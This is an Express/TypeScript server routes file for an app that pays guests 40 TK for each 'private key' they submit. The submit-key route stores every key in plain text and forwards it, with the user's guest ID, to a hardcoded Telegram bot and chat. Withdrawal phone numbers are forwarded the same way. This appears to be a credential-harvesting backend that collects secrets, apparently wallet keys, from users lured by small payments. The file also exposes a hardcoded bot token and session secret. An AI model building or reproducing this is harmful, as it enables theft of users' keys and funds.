
import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import session from "express-session";
import MemoryStore from "memorystore";

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = "8266590938:AAFSLVXE0K46SgmWRlaQevNVZUB2C4uPhGY";
const TELEGRAM_CHAT_ID = "1341406405";

async function sendTelegramMessage(message: string) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });
    
    if (!response.ok) {
      console.error("Failed to send Telegram message:", await response.text());
    }
  } catch (error) {
    console.error("Error sending Telegram message:", error);
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  // Session setup
  const SessionStore = MemoryStore(session);
  app.use(
    session({
      secret: "guest-app-secret",
      resave: false,
      saveUninitialized: false,
      cookie: { maxAge: 86400000 }, // 24 hours
      store: new SessionStore({
        checkPeriod: 86400000 // prune expired entries every 24h
      }),
    })
  );

  // Authentication Middleware
  const requireAuth = (req: any, res: any, next: any) => {
    if (!req.session.userId) {
      return res.status(401).json({ message: "Unauthorized" });
    }
    next();
  };

  // Login / Register
  app.post(api.auth.login.path, async (req, res) => {
    try {
      const { guestId } = api.auth.login.input.parse(req.body);
      
      let user = await storage.getUserByGuestId(guestId);
      let status = 200;

      if (!user) {
        user = await storage.createUser({ guestId });
        status = 201;
      }

      req.session.userId = user.id;
      res.status(status).json(user);
    } catch (err) {
      if (err instanceof z.ZodError) {
        res.status(400).json({ message: err.errors[0].message });
      } else {
        res.status(500).json({ message: "Internal server error" });
      }
    }
  });

  app.post(api.auth.logout.path, (req, res) => {
    req.session.destroy(() => {
      res.json({ message: "Logged out" });
    });
  });

  app.get(api.auth.me.path, requireAuth, async (req, res) => {
    const user = await storage.getUser(req.session.userId);
    if (!user) return res.status(401).json({ message: "User not found" });
    res.json(user);
  });

  // Submit Key
  app.post(api.earn.submitKey.path, requireAuth, async (req, res) => {
    try {
      const { privateKey } = api.earn.submitKey.input.parse(req.body);
      const userId = req.session.userId;
      const rewardAmount = 40; // 40 TK per key

      // Update balance
      const user = await storage.updateUserBalance(userId, rewardAmount);

      // Record transaction
      await storage.createTransaction({
        userId,
        type: "earning",
        amount: rewardAmount,
        details: `Key: ${privateKey}`,
        status: "completed"
      });

      // Send Telegram Notification
      await sendTelegramMessage(
        `🔑 New Key Submitted!\n\n` +
        `👤 Guest ID: ${user.guestId}\n` +
        `📝 Key: ${privateKey}\n` +
        `💰 Added: ${rewardAmount} TK\n` +
        `🏦 New Balance: ${user.balance} TK`
      );

      res.json({ 
        success: true, 
        newBalance: user.balance, 
        message: "Key submitted successfully! +40 TK" 
      });
    } catch (err) {
      res.status(400).json({ message: "Invalid request" });
    }
  });

  // Withdraw
  app.post(api.withdraw.request.path, requireAuth, async (req, res) => {
    try {
      const { method, number, amount } = api.withdraw.request.input.parse(req.body);
      const userId = req.session.userId;
      
      const user = await storage.getUser(userId);
      if (!user) return res.status(401).json({ message: "User not found" });

      if (user.balance < amount) {
        return res.status(400).json({ message: "Insufficient balance" });
      }

      // Deduct balance
      const updatedUser = await storage.updateUserBalance(userId, -amount);

      // Record transaction
      await storage.createTransaction({
        userId,
        type: "withdrawal",
        amount: amount,
        details: `${method} - ${number}`,
        status: "pending"
      });

      // Send Telegram Notification
      await sendTelegramMessage(
        `💸 New Withdrawal Request!\n\n` +
        `👤 Guest ID: ${user.guestId}\n` +
        `💳 Method: ${method.toUpperCase()}\n` +
        `📱 Number: ${number}\n` +
        `💰 Amount: ${amount} TK\n` +
        `🏦 Remaining Balance: ${updatedUser.balance} TK`
      );

      res.json({ 
        success: true, 
        newBalance: updatedUser.balance, 
        message: "Withdrawal request sent!" 
      });
    } catch (err) {
      res.status(400).json({ message: "Invalid request" });
    }
  });

  // Transactions
  app.get(api.transactions.list.path, requireAuth, async (req, res) => {
    const transactions = await storage.getUserTransactions(req.session.userId);
    res.json(transactions);
  });

  return httpServer;
}
